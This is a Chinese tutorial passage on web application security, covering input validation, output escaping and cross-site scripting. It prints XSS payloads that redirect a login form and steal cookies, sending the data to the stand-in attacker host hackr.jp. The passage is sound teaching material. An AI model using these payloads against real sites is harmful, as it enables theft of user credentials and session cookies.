实施 Web 应用的安全对策可大致分为以下两部分：

- 客户端的验证、
- Web 应用端（服务器端）的验证
  - 输入值验证
  - 输出值转义

![img](./assets/06.png)
> 图：验证数据的几个地方

多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。
保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI 体验的作用。

Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。
输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。

从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。
当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。










# 跨站脚本攻击（XSS）

跨站脚本攻击（Cross-site scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。
动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。

跨站脚本攻击有可能造成以下影响：

- 利用虚假输入表单骗取用户个人信息。 
- 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。 
- 显示伪造的文章或图片。



## 跨站脚本攻击案例

- **在动态生成 HTML 处发生**

  下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。

  ![img](./assets/07.png)
  > 图：跨站脚本攻击的案例

  确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口一郎这样的 HTML 标签的字符串。

  ![img](./assets/08.png)
  > 图：按照输入内容原样显示的机制

  此时的确认界面上，浏览器会把用户输入的 `<s>` 解析成 HTML 标签，然后显示删除线。
  删除线显示出来并不会造成太大的不利后果，但如果换成使用 script 标签将会如何呢。

- **XSS 是攻击者利用预先设置的陷阱触发的被动攻击**

  跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。

  下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。

  ![img](./assets/09.png)

  充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页面内，诱使用户去点击该 URL。

  ```js
  http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method==>"get";</script><span+s="
  ```

  浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。
  当用户在表单内输入 ID 和密码之后，就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。

  ![img](./assets/10.png)
  
  > 对 http://example.jp/login?ID=yama 请求时对应的 HTML 源代码（摘录）

  ```html
  <div class="logo">
    <img src="/img/logo.gif" alt="E!拍卖会" />
  </div>
  <form action="http://example.jp/login" method="post" id="login">
  <div class="input_id">
    ID <input type="text" name="ID" value="yama" />
  </div>
  ```

  > http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s=" 对请求时对应的HTML源代码（摘录）

  ```html
  <div class="logo">
    <img src="/img/logo.gif" alt="E!拍卖会 />
  </div>
  <form action="http://example.jp/login" method="post" id="login">
  <div class="input_id">
    ID <input type="text" name="ID" value=""><script>var f=document.getElementById("login");f.action="http://hackr.jp/pwget";f.method="get";</script><span s="" />
  </div>
  ```



## 对用户 Cookie 的窃取攻击

除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。

```html
<script src=http://hackr.jp/xss.js></script>
```

该脚本内指定的 http://hackr.jp/xss.js 文件。即下面这段采用 JavaScript 编写的代码。

```js
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段 JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。
然后这些信息会发送至攻击者的 Web 网站 http://hackr.jp/ ，记录在他的登录日志中。结果，攻击者就这样窃取到用户的 Cookie 信息了。

![img](./assets/11.png)
> 图：使用 XSS 攻击夺取 Cookie 信息









